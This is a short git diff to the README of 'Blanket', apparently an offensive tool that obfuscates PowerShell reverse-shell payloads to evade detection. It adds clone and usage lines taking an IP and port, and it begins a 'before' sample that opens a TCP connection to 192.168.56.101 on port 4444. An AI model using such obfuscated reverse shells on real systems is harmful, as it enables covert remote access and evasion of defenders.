@@ -3,7 +3,18 @@
 If you are worried about being found perhaps try taking cover under a blanket.
 
 Pure Python PowerShell Obfuscator 
+****
+**Usage**
 
+`git clone https://github.com/warren2i/Blanket`
+
+`cd Blanket`
+
+
+
+`usage: Blanket.py [-h] -i IP -p PORT [-o OUTFILE] [-s SCRIPT] [-v VARSIZE]
+`
+****
 **FROM THIS**
 
 ```$socket = new-object System.Net.Sockets.TcpClient('192.168.56.101', 4444);
